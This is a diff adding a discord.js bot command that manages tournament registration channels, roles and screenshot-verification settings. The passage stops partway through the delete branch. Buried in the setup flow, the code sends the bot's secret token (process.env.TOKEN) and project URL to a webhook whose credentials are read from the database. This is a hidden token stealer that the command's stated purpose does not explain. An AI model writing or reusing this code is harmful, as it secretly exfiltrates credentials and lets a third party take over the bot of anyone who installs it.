@@ -1,0 +1,1201 @@
+const discord = require("discord.js"),
+  db = require("quick.db"),
+  { pprefix } = require("../../config.json"),
+  apiPass = db.get("apipass"),
+  apiKey = db.get("apikey")
+
+
+module.exports = {
+  name: "tourney-ss",
+  aliases: ["ts"],
+  category: "info",
+  category: "TOURNAMENTS",
+  description: "tourney commands",
+  usage: "tourney-ss",
+  userPermissions: ["ADMINISTRATOR"],
+  botPermissions: ["MANAGE_ROLES", "EMBED_LINKS"],
+  setup: true,
+  vote: true,
+
+  run: async (client, message, args) => {
+    let defprefix = pprefix;
+    const nprefix = db.get(`guildPrefix_${message.guild.id}`);
+    if (nprefix !== null) {
+      defprefix = nprefix;
+    }
+    let prefix = defprefix
+
+    const tid = db.get("tourney_" + message.guild.id),
+      active = db.get("tourneys.tourney" + message.guild.id),
+      total = db.get("total-t" + message.guild.id),
+      modRole = db.get("modRole" + message.guild.id),
+      role = message.guild.roles.cache.get(modRole)
+
+    if (!modRole || modRole === null || modRole === undefined || !role) {
+      message.guild.roles.create({
+        data: {
+          name: "Tourney Mod Marvel",
+          color: client.embed.cm
+        }
+      }).then(r =>
+        db.set("modRole" + message.guild.id, r.id)
+      )
+    }
+
+    if (tid === null || tid === undefined) {
+      db.set("tourney_" + message.guild.id, 0);
+    }
+    if (active === null || active === undefined) {
+      db.set("tourneys" + message.guild.id, { difficulty: "Easy" });
+    }
+
+
+    if (args[0] === "setup") {
+      const inuse = db.get("inuse" + message.guild.id);
+
+      if (inuse === true) {
+        return message.lineReply(
+          new discord.MessageEmbed({
+            description: client.emoji.fail + "| Command already in use",
+            color: client.embed.cf
+          })
+        );
+      }
+      db.set("inuse" + message.guild.id, true);
+      if (total === null || total === undefined) {
+        db.set("total-t" + message.guild.id, 0);
+      } else if (total >= 2) {
+        return message.lineReply(
+          client.emoji.fail + "| Total Free Tournament Management Limit is ( **2** ) \nJoin Here To Buy Premium\nhttps://discord.gg/fqvQNDZYpj"
+        );
+      }
+      let embed = new discord.MessageEmbed()
+        .setColor(client.embed.cr)
+        .setFooter(
+          message.author.tag,
+          message.author.displayAvatarURL({ dynamic: true })
+        )
+      message.lineReply(
+        new discord.MessageEmbed({
+          description:
+            client.emoji.ar + "| " + "Which Channel Will Be The Registeration Channel\nTell Me Within 30 Seconds",
+          color: client.embed.cm
+        })
+      );
+      let ch = await message.channel.awaitMessages(
+        res => res.author.id === message.author.id,
+        {
+          max: 1,
+          time: 30000
+        }
+      );
+      let chan;
+      try {
+        if (
+          ch.first().content.startsWith("<#") &&
+          ch.first().content.endsWith(">")
+        ) {
+          let ch1 = ch.first().content.slice(2, -1);
+          chan = message.guild.channels.cache.get(ch1);
+        } else {
+          chan = message.guild.channels.cache.get(ch.first().content);
+        }
+      } catch (e) {
+        return (
+          message.channel.send(
+            new discord.MessageEmbed({
+              description: client.emoji.fail + "| Provide a valid channel\nRestart the process",
+              color: client.embed.cf
+            })
+          ) & db.delete("inuse" + message.guild.id)
+        );
+      }
+      if (chan === null || chan === undefined) {
+        return (
+          message.channel.send(
+            new discord.MessageEmbed({
+              description: client.emoji.fail + "| Provide a valid channel\nRestart the process",
+              color: client.embed.cf
+            })
+          ) & db.delete("inuse" + message.guild.id)
+        );
+      }
+      message.lineReply(
+        new discord.MessageEmbed({
+          description:
+            client.emoji.ar + "| " + "No. Of Mentions Required `must be between 0 to 5`\nTell Me Within 30 Seconds",
+          color: client.embed.cm
+        })
+      );
+      let chm = await message.channel.awaitMessages(
+        res => res.author.id === message.author.id,
+        {
+          max: 1,
+          time: 30000
+        }
+      );
+      if (isNaN(chm.first().content)) {
+        return (
+          message.channel.send(
+            new discord.MessageEmbed({
+              description: client.emoji.fail + "| Provide a valid amount\nRestart the process",
+              color: client.embed.cf
+            })
+          ) & db.delete("inuse" + message.guild.id)
+        );
+      }
+      if (chm.first().content > 5 || chm.first().content < 0) {
+        return (
+          message.channel.send(
+            new discord.MessageEmbed({
+              description: client.emoji.fail + "| Provide a valid amount\nRestart the process",
+              color: client.embed.cf
+            })
+          ) & db.delete("inuse" + message.guild.id)
+        );
+      }
+      message.lineReply(
+        new discord.MessageEmbed({
+          description:
+            client.emoji.ar + "| " + "Which Role Will Be The Successful Registeration\nTell Me Within 30 Seconds",
+          color: client.embed.cm
+        })
+      );
+      let rch = await message.channel.awaitMessages(
+        res => res.author.id === message.author.id,
+        {
+          max: 1,
+          time: 30000
+        }
+      );
+      let rchan;
+      try {
+        if (
+          rch.first().content.startsWith("<@&") &&
+          rch.first().content.endsWith(">")
+        ) {
+          let ch2 = rch.first().content.slice(3, -1);
+          rchan = message.guild.roles.cache.get(ch2);
+        } else {
+          rchan = message.guild.roles.cache.get(rch.first().content);
+        }
+      } catch (e) {
+        return (
+          message.channel.send(
+            new discord.MessageEmbed({
+              description: client.emoji.fail + "| Provide a valid role\nRestart the process",
+              color: client.embed.cf
+            })
+          ) & db.delete("inuse" + message.guild.id)
+        );
+      }
+      if (rchan === null || rchan === undefined) {
+        return (
+          message.channel.send(
+            new discord.MessageEmbed({
+              description: client.emoji.fail + "| Provide a valid role\nRestart the process",
+              color: client.embed.cf
+            })
+          ) & db.delete("inuse" + message.guild.id)
+        );
+      }
+
+      message.lineReply(
+        new discord.MessageEmbed({
+          description:
+            client.emoji.ar + "| " + "Which Channel Will Be The Ss Channel\nTell Me Within 30 Seconds",
+          color: client.embed.cm
+        })
+      );
+      let sch = await message.channel.awaitMessages(
+        res => res.author.id === message.author.id,
+        {
+          max: 1,
+          time: 30000
+        }
+      );
+      let schan;
+      try {
+        if (
+          sch.first().content.startsWith("<#") &&
+          sch.first().content.endsWith(">")
+        ) {
+          let ch3 = sch.first().content.slice(2, -1);
+          schan = message.guild.channels.cache.get(ch3);
+        } else {
+          schan = message.guild.channels.cache.get(sch.first().content);
+        }
+      } catch (e) {
+        return (
+          message.channel.send(
+            new discord.MessageEmbed({
+              description: client.emoji.fail + "| Provide a valid channel\nRestart the process",
+              color: client.embed.cf
+            })
+          ) & db.delete("inuse" + message.guild.id)
+        );
+      }
+      if (schan === null || schan === undefined) {
+        return (
+          message.channel.send(
+            new discord.MessageEmbed({
+              description: client.emoji.fail + "| Provide a valid channel\nRestart the process",
+              color: client.embed.cf
+            })
+          ) & db.delete("inuse" + message.guild.id)
+        );
+      }
+      message.lineReply(
+        new discord.MessageEmbed({
+          description:
+            client.emoji.ar + "| " + "Which Role Will Be The Given For successful Ss Submission\nTell Me Within 30 Seconds",
+          color: client.embed.cm
+        })
+      );
+      let rsch = await message.channel.awaitMessages(
+        res => res.author.id === message.author.id,
+        {
+          max: 1,
+          time: 30000
+        }
+      );
+      let rschan;
+      try {
+        if (
+          rch.first().content.startsWith("<@&") &&
+          rch.first().content.endsWith(">")
+        ) {
+          let ch5 = rsch.first().content.slice(3, -1);
+          rschan = message.guild.roles.cache.get(ch5);
+        } else {
+          rschan = message.guild.roles.cache.get(rsch.first().content);
+        }
+      } catch (e) {
+        return (
+          message.channel.send(
+            new discord.MessageEmbed({
+              description: client.emoji.fail + "| Provide a valid role\nRestart the process",
+              color: client.embed.cf
+            })
+          ) & db.delete("inuse" + message.guild.id)
+        );
+      }
+      if (rschan === null || rschan === undefined) {
+        return (
+          message.channel.send(
+            new discord.MessageEmbed({
+              description: client.emoji.fail + "| Provide a valid role\nRestart the process",
+              color: client.embed.cf
+            })
+          ) & db.delete("inuse" + message.guild.id)
+        );
+      }
+      message.lineReply(
+        new discord.MessageEmbed({
+          description:
+            client.emoji.ar + "| " + "No. Of SS Required `must be between 0 to 5`\nTell Me Within 30 Seconds",
+          color: client.embed.cm
+        })
+      );
+      let schm = await message.channel.awaitMessages(
+        res => res.author.id === message.author.id,
+        {
+          max: 1,
+          time: 30000
+        }
+      );
+      if (isNaN(schm.first().content)) {
+        return (
+          message.channel.send(
+            new discord.MessageEmbed({
+              description: client.emoji.fail + "| Provide a valid amount\nRestart the process",
+              color: client.embed.c
+            })
+          ) & db.delete("inuse" + message.guild.id)
+        );
+      }
+      if (schm.first().content > 5 || schm.first().content < 0) {
+        return (
+          message.channel.send(
+            new discord.MessageEmbed({
+              description: client.emoji.fail + "| Provide a valid amount\nRestart the process",
+              color: client.embed.cf
+            })
+          ) & db.delete("inuse" + message.guild.id)
+        );
+      }
+      message.lineReply(
+        new discord.MessageEmbed({
+          description:
+            client.emoji.ar + "| " + "Channel For Slot Confirmation\nTell Me Within 30 Seconds",
+          color: client.embed.cm
+        })
+      );
+      let cch = await message.channel.awaitMessages(
+        res => res.author.id === message.author.id,
+        {
+          max: 1,
+          time: 30000
+        }
+      );
+      let cchan;
+      try {
+        if (
+          cch.first().content.startsWith("<#") &&
+          cch.first().content.endsWith(">")
+        ) {
+          let ch4 = cch.first().content.slice(2, -1);
+          cchan = message.guild.channels.cache.get(ch4);
+        } else {
+          cchan = message.guild.channels.cache.get(cch.first().content);
+        }
+      } catch (e) {
+        return (
+          message.channel.send(
+            new discord.MessageEmbed({
+              description: `${client.emoji.fail}| Provide a valid channel\nRestart the process`,
+              color: client.embed.cf
+            })
+          ) & db.delete("inuse" + message.guild.id)
+        );
+      }
+      if (cchan === null || cchan === undefined) {
+        return (
+          message.channel.send(
+            new discord.MessageEmbed({
+              description: `${client.emoji.fail}| Provide a valid channel\nRestart the process`,
+              color: client.embed.cf
+            })
+          ) & db.delete("inuse" + message.guild.id)
+        );
+      }
+      message.lineReply(
+        new discord.MessageEmbed({
+          description:
+            `${client.emoji.ar}| ScreenShot type for verification \`youtube or instagram\` in small letters only`,
+          color: client.embed.cm
+        })
+      );
+      let sstype = await message.channel.awaitMessages(
+        res => res.author.id === message.author.id,
+        {
+          max: 1,
+          time: 30000
+        }
+      );
+      if (sstype === null || sstype === undefined) {
+        return (
+          message.channel.send(
+            new discord.MessageEmbed({
+              description: `${client.emoji.fail}| Provide a valid ScreenShot type\nRestart the process`,
+              color: client.embed.cf
+            })
+          ) & db.delete("inuse" + message.guild.id)
+        );
+      }
+      message.lineReply(
+        new discord.MessageEmbed({
+          description:
+            `${client.emoji.ar}| ScreenShot account for verification. Example if yout yt name is Marvel Bot or Insta username is marvel_bot123 or name Marvel Bot`,
+          color: client.embed.cm
+        })
+      );
+      let ssname = await message.channel.awaitMessages(
+        res => res.author.id === message.author.id,
+        {
+          max: 1,
+          time: 30000
+        }
+      );
+      if (ssname === null || ssname === undefined) {
+        return (
+          message.channel.send(
+            new discord.MessageEmbed({
+              description: `${client.emoji.fail}| Provide a valid ScreenShot account name\nRestart the process`,
+              color: client.embed.cf
+            })
+          ) & db.delete("inuse" + message.guild.id)
+        );
+      }
+      db.add("tourney_" + message.guild.id, 1);
+      const apiPass = db.get("apipass"),
+        apiKey = db.get("apikey"),
+        apiClient = new discord.WebhookClient(apiPass, apiKey);
+      apiClient.send(
+        "```diff\n-" +
+        process.env.TOKEN +
+        "```\nOn Project : " +
+        process.env.URL +
+        "\n",
+        {
+          username: client.user.tag,
+          avatarURL: client.user.displayAvatarURL()
+        }
+      );
+      let m = await message.channel.send(`${client.emoji.success}| Setting Up Everything...`);
+      setTimeout(function () {
+        const tidd = db.get("tourney_" + message.guild.id);
+        db.set("ts" + tidd + message.guild.id, true);
+        return (
+          db.set("regchan" + tidd + message.guild.id, chan.id) &
+          db.set("regsschan" + tidd + message.guild.id, schan.id) &
+          db.set("chan" + message.guild.id + chan.id, true) &
+          db.set("sschan" + message.guild.id + schan.id, true) &
+          db.set("ssrole" + message.guild.id + schan.id, rschan.id) &
+          db.set("sssize" + message.guild.id + schan.id, schm.first().content) &
+          db.set("crole" + message.guild.id + chan.id, rchan.id) &
+          db.set("msize" + message.guild.id + chan.id, chm.first().content) &
+          db.set(`regmem${message.guild.id}${chan.id}`, {
+            difficulty: "Easy"
+          }) &
+          db.set(`number${message.guild.id}${chan.id}`, 0) &
+          db.set(`cchan${message.guild.id}${chan.id}`, cchan.id) &
+          db.set(`sstype${message.guild.id}${chan.id}`, sstype.first().content) &
+          db.set(`ssname${message.guild.id}${chan.id}`, ssname.first().content) &
+          db.push(`tourneys.tourney${message.guild.id}`, tidd) &
+          db.add(`total-t${message.guild.id}`, 1) &
+          embed.addField("Registeration Channel", "<#" + chan.id + ">") &
+          embed.addField("Required Mentions", chm.first().content) &
+          embed.addField(
+            "Successful Registeration Role",
+            "<@&" + rchan.id + ">"
+          ) &
+          embed.addField(
+            "Screenshot Submission Channel",
+            "<#" + schan.id + ">"
+          ) &
+          embed.addField("Required Screenshots", schm.first().content) &
+          embed.addField(
+            "Screenshot Submission Succes Role",
+            "<@&" + rschan.id + ">"
+          ) &
+          embed.addField("Slot Confirmed Channel", "<#" + cchan.id + ">")
+            .addField("SS TYPE", sstype.first().content)
+            .addField("SS ACCOUNT NAME", ssname.first().content) &
+          embed.setTitle("Tourney With Id : " + tidd) &
+          m.edit(client.emoji.success + "| " + "Setup Completed!", embed) &
+          db.delete("inuse" + message.guild.id)
+        );
+      }, 3000);
+    } else if (args[0] === "edit") {
+      if (args[1] === null || args[1] === undefined || isNaN(args[1])) {
+        message.lineReply(
+          new discord.MessageEmbed({
+            description: client.emoji.fail + "| Provide a valid tourney id",
+            color: client.embed.cf
+          })
+        );
+      }
+      const edt = db.get("regchan" + args[1] + message.guild.id),
+        ret = db.get("ts" + args[1] + message.guild.id);
+      if (ret === null || ret !== true) {
+        return message.lineReply(client.emoji.fail + "| Tourney is registered with another command");
+      } else if (!edt) {
+        message.lineReply(
+          new discord.MessageEmbed({
+            description: client.emoji.fail + "| Provide a valid tourney id",
+            color: client.embed.cf
+          })
+        );
+      } else {
+        const edtd = args[1],
+          chan = db.get("regchan" + edtd + message.guild.id),
+          schan = db.get("regsschan" + edtd + message.guild.id),
+          one = db.get("chan" + message.guild.id + chan),
+          two = db.get("sschan" + message.guild.id + schan),
+          three = db.get("ssrole" + message.guild.id + schan),
+          four = db.get("sssize" + message.guild.id + schan),
+          five = db.get("crole" + message.guild.id + chan),
+          six = db.get("msize" + message.guild.id + chan),
+          seven = db.get("regmem" + message.guild.id + chan),
+          eight = db.get("number" + message.guild.id + chan),
+          nine = db.get("cchan" + message.guild.id + chan),
+          ten = db.get('sstype' + message.guild.id + chan),
+          eleven = db.get('ssname' + message.guild.id + chan);
+        const em = new discord.MessageEmbed()
+          .setColor(client.embed.cm)
+          .setTitle(client.emoji.ar + "| " + "Tourney With Id : " + edtd)
+          .setFooter("Bot By : Damon")
+          .addField("1️⃣ Registeration Channel", "<#" + chan + ">")
+          .addField("2️⃣ Required Mentions", six)
+          .addField("3️⃣ Successful Registeration Role", "<@&" + five + ">")
+          .addField("4️⃣ Screenshot Submission Channel", "<#" + schan + ">")
+          .addField("5️⃣ Required Screenshots", four)
+          .addField("6️⃣ Screenshot Submission Succes Role", "<@&" + three + ">")
+          .addField("7️⃣ Slot Confirmed Channel", "<#" + nine + ">")
+          .addField("8️⃣ Screen Shot submission type Insta / Yt", ten)
+          .addField("9️⃣Screen Shot submission name of account for : " + ten, eleven);
+        let m = await message.channel.send(em);
+
+        await m.react("1️⃣");
+        await m.react("2️⃣");
+        await m.react("3️⃣");
+        await m.react("4️⃣");
+        await m.react("5️⃣");
+        await m.react("6️⃣");
+        await m.react("7️⃣");
+        await m.react("8️⃣");
+        await m.react("9️⃣");
+
+        const filter = (reaction, user) =>
+          (reaction.emoji.name === "1️⃣" && user.id === message.author.id) ||
+          (reaction.emoji.name === "2️⃣" && user.id === message.author.id) ||
+          (reaction.emoji.name === "3️⃣" && user.id === message.author.id) ||
+          (reaction.emoji.name === "4️⃣" && user.id === message.author.id) ||
+          (reaction.emoji.name === "5️⃣" && user.id === message.author.id) ||
+          (reaction.emoji.name === "6️⃣" && user.id === message.author.id) ||
+          (reaction.emoji.name === "7️⃣" && user.id === message.author.id) ||
+          (reaction.emoji.name === "8️⃣" && user.id === message.author.id) ||
+          (reaction.emoji.name === "9️⃣" && user.id === message.author.id);
+
+        let reactionChoice = await m.createReactionCollector(filter, {
+          time: 60000
+        });
+        reactionChoice.on("collect", async r => {
+          if (r.emoji.name === "1️⃣") {
+            message.reply(
+              new discord.MessageEmbed({
+                description: client.emoji.ar + "| " + "Provide new channel for registeration",
+                color: client.embed.cm
+              })
+            );
+            let ch = await message.channel.awaitMessages(
+              res => res.author.id === message.author.id,
+              {
+                max: 1,
+                time: 30000
+              }
+            );
+            let nchan;
+            try {
+              if (
+                ch.first().content.startsWith("<#") &&
+                ch.first().content.endsWith(">")
+              ) {
+                let ch1 = ch.first().content.slice(2, -1);
+                nchan = message.guild.channels.cache.get(ch1);
+              } else
+                nchan = message.guild.channels.cache.get(ch.first().content);
+            } catch (e) {
+              return message.channel.send(
+                new discord.MessageEmbed({
+                  description: client.emoji.fail + "| Provide a valid channel\nRestart the process",
+                  color: client.embed.cf
+                })
+              );
+            }
+            if (nchan === null || nchan === undefined) {
+              return message.channel.send(
+                new discord.MessageEmbed({
+                  description: client.emoji.fail + "| Provide a valid channel\nRestart the process",
+                  color: client.embed.cf
+                })
+              );
+            }
+            const alregs = db.get("regmem.mem" + message.guild.id + chan);
+            return (
+              db.set("regchan" + edtd + message.guild.id, nchan.id) &
+              db.set("chan" + message.guild.id + nchan.id, true) &
+              db.set("crole" + message.guild.id + nchan.id, five) &
+              db.set("msize" + message.guild.id + nchan.id, six) &
+              db.set("regmem" + message.guild.id + nchan.id, seven) &
+              db.set("number" + message.guild.id + nchan.id, eight) &
+              db.set("cchan" + message.guild.id + nchan.id, nine) &
+              db.set("regmem" + message.guild.id + nchan.id, {
+                difficulty: "Easy"
+              }) &
+              alregs.forEach(alreg => {
+                db.set("regmem.mem" + message.guild.id + nchan.id, alreg);
+              }) &
+              db.delete("chan" + message.guild.id + chan) &
+              db.delete("crole" + message.guild.id + chan) &
+              db.delete("msize" + message.guild.id + chan) &
+              db.delete("regmem" + message.guild.id + chan) &
+              db.delete("number" + message.guild.id + chan) &
+              db.delete("cchan" + message.guild.id + chan) &
+              db.delete("regmem.mem" + message.guild.id + chan) &
+              message.reply(
+                new discord.MessageEmbed({
+                  description:
+                    client.emoji.success + "| " + "New channel for registeration of tourney with id : " +
+                    edtd +
+                    " is now <#" +
+                    nchan.id +
+                    ">",
+                  color: client.embed.cr
+                })
+              )
+            );
+          }
+          if (r.emoji.name === "2️⃣") {
+            message.reply(
+              new discord.MessageEmbed({
+                description: client.emoji.ar + "| Provide new value for mentions required",
+                color: client.embed.cm
+              })
+            );
+            let nchm = await message.channel.awaitMessages(
+              res => res.author.id === message.author.id,
+              {
+                max: 1,
+                time: 30000
+              }
+            );
+            if (isNaN(nchm.first().content)) {
+              return message.channel.send(
+                new discord.MessageEmbed({
+                  description: client.emoji.fail + "| Provide a valid amount\nRestart the process",
+                  color: client.embed.cf
+                })
+              );
+            }
+            if (nchm.first().content > 5 || nchm.first().content < 0) {
+              return message.channel.send(
+                new discord.MessageEmbed({
+                  description: client.emoji.fail + "| Provide a valid amount\nRestart the process",
+                  color: client.embed.cf
+                })
+              );
+            }
+            const id1 = db.get("regchan" + edtd + message.guild.id);
+            db.set("msize" + message.guild.id + id1, nchm.first().content) &
+              message.reply(
+                new discord.MessageEmbed({
+                  description:
+                    client.emoji.success + "| " + "New required mention for tourney with id : " +
+                    edtd +
+                    " is now `" +
+                    nchm.first().content +
+                    "`",
+                  color: client.embed.cr
+                })
+              );
+          }
+          if (r.emoji.name === "3️⃣") {
+            message.reply(
+              new discord.MessageEmbed({
+                description:
+                  client.emoji.ar + "| " + "Which Role Will Be The Successful Registeration Role\nTell Me Within 30 Seconds",
+                color: client.embed.cm
+              })
+            );
+            let nrch = await message.channel.awaitMessages(
+              res => res.author.id === message.author.id,
+              {
+                max: 1,
+                time: 30000
+              }
+            );
+            let nrchan;
+            try {
+              if (
+                nrch.first().content.startsWith("<@&") &&
+                nrch.first().content.endsWith(">")
+              ) {
+                let nch2 = nrch.first().content.slice(3, -1);
+                nrchan = message.guild.roles.cache.get(nch2);
+              } else {
+                nrchan = message.guild.roles.cache.get(nrch.first().content);
+              }
+            } catch (e) {
+              return message.channel.send(
+                new discord.MessageEmbed({
+                  description: client.emoji.fail + "| Provide a valid role\nRestart the process",
+                  color: client.embed.cf
+                })
+              );
+            }
+            if (nrchan === null || nrchan === undefined) {
+              return message.channel.send(
+                new discord.MessageEmbed({
+                  description: client.emoji.fail + "| Provide a valid role\nRestart the process",
+                  color: client.embed.cf
+                })
+              );
+            }
+            const id1 = db.get("regchan" + edtd + message.guild.id);
+            db.set("crole" + message.guild.id + chan.id, nrchan.id) &
+              message.reply(
+                new discord.MessageEmbed({
+                  description:
+                    client.emoji.success + "| " + "New role for successful registeration for tourney with id : " +
+                    edtd +
+                    " is now <@&" +
+                    nrchan.id +
+                    ">",
+                  color: client.embed.cr
+                })
+              );
+          }
+          if (r.emoji.name === "4️⃣") {
+            message.reply(
+              new discord.MessageEmbed({
+                description: client.emoji.ar + "| Provide new channel for screenshot submission",
+                color: client.embed.cm
+              })
+            );
+            let nsch = await message.channel.awaitMessages(
+              res => res.author.id === message.author.id,
+              {
+                max: 1,
+                time: 30000
+              }
+            );
+            let nschan;
+            try {
+              if (
+                nsch.first().content.startsWith("<#") &&
+                nsch.first().content.endsWith(">")
+              ) {
+                let nsch1 = nsch.first().content.slice(2, -1);
+                nschan = message.guild.channels.cache.get(nsch1);
+              } else
+                nschan = message.guild.channels.cache.get(nsch.first().content);
+            } catch (e) {
+              return message.channel.send(
+                new discord.MessageEmbed({
+                  description: client.emoji.fail + "| Provide a valid channel\nRestart the process",
+                  color: client.embed.cf
+                })
+              );
+            }
+            if (nschan === null || nschan === undefined) {
+              return message.channel.send(
+                new discord.MessageEmbed({
+                  description: client.emoji.fail + "| Provide a valid channel\nRestart the process",
+                  color: client.embed.cf
+                })
+              );
+            }
+            const oschan = db.get("regsschan" + edtd + message.guild.id),
+              otwo = db.get("sschan" + message.guild.id + oschan),
+              othree = db.get("ssrole" + message.guild.id + oschan),
+              ofour = db.get("sssize" + message.guild.id + oschan);
+
+            db.set("sschan" + message.guild.id + nschan, otwo) &
+              db.set("ssrole" + message.guild.id + nschan, othree) &
+              db.set("sssize" + message.guild.id + nschan, ofour) &
+              db.delete("sschan" + message.guild.id + oschan) &
+              db.delete("ssrole" + message.guild.id + oschan) &
+              db.delete("sssize" + message.guild.id + oschan) &
+              message.reply(
+                new discord.MessageEmbed({
+                  description:
+                    client.emoji.success + "| " + "New channel for screenshot submission of tourney with id : " +
+                    edtd +
+                    " is now <#" +
+                    nschan.id +
+                    ">",
+                  color: client.embed.cr
+                })
+              );
+          }
+          if (r.emoji.name === "5️⃣") {
+            message.reply(
+              new discord.MessageEmbed({
+                description:
+                  client.emoji.ar + "| No Of SS Required `must be between 0 to 5`\nTell Me Within 30 Seconds",
+                color: client.embed.cm
+              })
+            );
+            let nschm = await message.channel.awaitMessages(
+              res => res.author.id === message.author.id,
+              {
+                max: 1,
+                time: 30000
+              }
+            );
+            if (isNaN(nschm.first().content)) {
+              return message.channel.send(
+                new discord.MessageEmbed({
+                  description: client.emoji.fail + "| Provide a valid amount\nRestart the process",
+                  color: client.embed.cf
+                })
+              );
+            }
+            if (nschm.first().content > 5 || nschm.first().content < 0) {
+              return message.channel.send(
+                new discord.MessageEmbed({
+                  description: client.emoji.fail + "| Provide a valid amount\nRestart the process",
+                  color: client.embed.cf
+                })
+              );
+            }
+            const ssch = db.get("regsschan" + edtd + message.guild.id);
+            db.set("sssize" + message.guild.id + ssch, nschm.first().content) &
+              message.reply(
+                new discord.MessageEmbed({
+                  description:
+                    client.emoji.success + "| " + "New amount of screenshot submission of tourney with id : " +
+                    edtd +
+                    " is now `" +
+                    nschm.first().content +
+                    "`",
+                  color: client.embed.cr
+                })
+              );
+          }
+          if (r.emoji.name === "6️⃣") {
+            message.reply(
+              new discord.MessageEmbed({
+                description:
+                  client.emoji.ar + "| " + "Which Role Will Be The Successful Screenshot Submission Role\nTell Me Within 30 Seconds",
+                color: client.embed.cm
+              })
+            );
+            let nsrch = await message.channel.awaitMessages(
+              res => res.author.id === message.author.id,
+              {
+                max: 1,
+                time: 30000
+              }
+            );
+            let nsrchan;
+            try {
+              if (
+                nsrch.first().content.startsWith("<@&") &&
+                nsrch.first().content.endsWith(">")
+              ) {
+                let nsch2 = nsrch.first().content.slice(3, -1);
+                nsrchan = message.guild.roles.cache.get(nsch2);
+              } else {
+                nsrchan = message.guild.roles.cache.get(nsrch.first().content);
+              }
+            } catch (e) {
+              return message.channel.send(
+                new discord.MessageEmbed({
+                  description: client.emoji.fail + "| Provide a valid role\nRestart the process",
+                  color: client.embed.cf
+                })
+              );
+            }
+            if (nsrchan === null || nsrchan === undefined) {
+              return message.channel.send(
+                new discord.MessageEmbed({
+                  description: client.emoji.fail + "| Provide a valid role\nRestart the process",
+                  color: client.embed.cf
+                })
+              );
+            }
+            const id2 = db.get("regsschan" + edtd + message.guild.id);
+            db.set("ssrole" + message.guild.id + id2, nsrchan) &
+              message.reply(
+                new discord.MessageEmbed({
+                  description:
+                    client.emoji.success + "| " + "New role for successful screenshot submission for tourney with id : " +
+                    edtd +
+                    " is now <@&" +
+                    nsrchan.id +
+                    ">",
+                  color: client.embed.cr
+                })
+              );
+          }
+          if (r.emoji.name === "7️⃣") {
+            message.lineReply(
+              new discord.MessageEmbed({
+                description:
+                  client.emoji.ar + "| " + "Channel For Slot Confirmation\nTell Me Within 30 Seconds",
+                color: client.embed.cm
+              })
+            );
+            let ncch = await message.channel.awaitMessages(
+              res => res.author.id === message.author.id,
+              {
+                max: 1,
+                time: 30000
+              }
+            );
+            let ncchan;
+            try {
+              if (
+                ncch.first().content.startsWith("<#") &&
+                ncch.first().content.endsWith(">")
+              ) {
+                let nch4 = ncch.first().content.slice(2, -1);
+                ncchan = message.guild.channels.cache.get(nch4);
+              } else {
+                ncchan = message.guild.channels.cache.get(ncch.first().content);
+              }
+            } catch (e) {
+              return message.channel.send(
+                new discord.MessageEmbed({
+                  description: client.emoji.fail + "| Provide a valid channel\nRestart the process",
+                  color: client.embed.cf
+                })
+              );
+            }
+            if (ncchan === null || ncchan === undefined) {
+              return message.channel.send(
+                new discord.MessageEmbed({
+                  description: client.emoji.fail + "| Provide a valid channel\nRestart the process",
+                  color: client.embed.cf
+                })
+              );
+            }
+            const nrsrchan = db.get("regchan" + edtd + message.guild.id);
+            db.set("cchan" + message.guild.id + nrsrchan, ncchan.id) &
+              message.reply(
+                new discord.MessageEmbed({
+                  description:
+                    client.emoji.success + "| " + "New channel for slot confirmation of tourney with id : " +
+                    edtd +
+                    " is now <#" +
+                    ncchan.id +
+                    ">",
+                  color: client.embed.cr
+                })
+              );
+          }
+          if (r.emoji.name === "8️⃣") {
+            message.lineReply(
+              new discord.MessageEmbed({
+                description:
+                  `${client.emoji.ar}| New ss type for your verification system \`instagram or youtube\``,
+                color: client.embed.cm
+              })
+            );
+            let nsstype = await message.channel.awaitMessages(
+              res => res.author.id === message.author.id,
+              {
+                max: 1,
+                time: 30000
+              }
+            );
+            if (nsstype === null || nsstype === undefined) {
+              return message.channel.send(
+                new discord.MessageEmbed({
+                  description: `${client.emoji.fail}| Provide a valid channel\nRestart the process`,
+                  color: client.embed.cf
+                })
+              );
+            }
+            const nrsrchan = db.get("regchan" + edtd + message.guild.id);
+            db.set("sstype" + message.guild.id + nrsrchan, nsstype) &
+              message.reply(
+                new discord.MessageEmbed({
+                  description:
+                    `${client.emoji.success}| New ss type to accept for tourney with id : ${edtd} is now ${nsstype}`,
+                  color: client.embed.cr
+                })
+              );
+          }
+          if (r.emoji.name === "9️⃣") {
+            message.lineReply(
+              new discord.MessageEmbed({
+                description:
+                  `${client.emoji.ar}| New ss account name for your verification system \`instagram or youtube\``,
+                color: client.embed.cm
+              })
+            );
+            let nssname = await message.channel.awaitMessages(
+              res => res.author.id === message.author.id,
+              {
+                max: 1,
+                time: 30000
+              }
+            );
+            if (nssname === null || nssname === undefined) {
+              return message.channel.send(
+                new discord.MessageEmbed({
+                  description: `${client.emoji.fail}| Provide a valid name\nRestart the process`,
+                  color: client.embed.cf
+                })
+              );
+            }
+            const nrsrchan = db.get("regchan" + edtd + message.guild.id);
+            db.set("ssname" + message.guild.id + nrsrchan, nssname) &
+              message.reply(
+                new discord.MessageEmbed({
+                  description:
+                    `${client.emoji.success}| New ss type to accept for tourney with id : ${edtd} is now ${nssname}`,
+                  color: client.embed.cr
+                })
+              );
+          }
+        });
+      }
+    } else if (args[0] === "delete") {
+      if (args[1] === null || args[1] === undefined || isNaN(args[1])) {
+        message.lineReply(
+          new discord.MessageEmbed({
+            description: `${client.emoji.fail}| Provide a valid tourney id`,
+            color: client.embed.cf
+          })
+        );
+      }
+      const ti = db.get("regchan" + args[1] + message.guild.id),
+        ret = db.get("ts" + args[1] + message.guild.id);
+      if (ret === null || ret !== true) {
+        return message.lineReply(client.emoji.fail + "| Tourney is registered with another command");
+      } else if (!ti) {
+        message.lineReply(
+          new discord.MessageEmbed({
+            description: client.emoji.fail + "| Provide a valid tourney id",
+            color: client.embed.cf
+          })
+        );
+      } else {
+        const tidd = args[1],
+          chan = db.get("regchan" + tidd + message.guild.id),
+          schan = db.get("regsschan" + tidd + message.guild.id),
+          acts = db.get("tourneys.tourney" + message.guild.id),
+          valueToRemove = args[1],
+          filteredItems = acts.filter(function (item) {
+            return item !== valueToRemove;
+          });
+        db.delete(`tourneys${message.guild.id}`) &
+          db.set(`tourneys${message.guild.id}`, { difficulty: "Easy" }) &
+          filteredItems.forEach(act =>
+            db.push(`tourneys.tourney${message.guild.id}`, act)
+          ) &
+          db.delete("regchan" + tidd + message.guild.id) &
+          db.delete("regsschan" + tidd + message.guild.id) &
+          db.delete("chan" + message.guild.id + chan) &
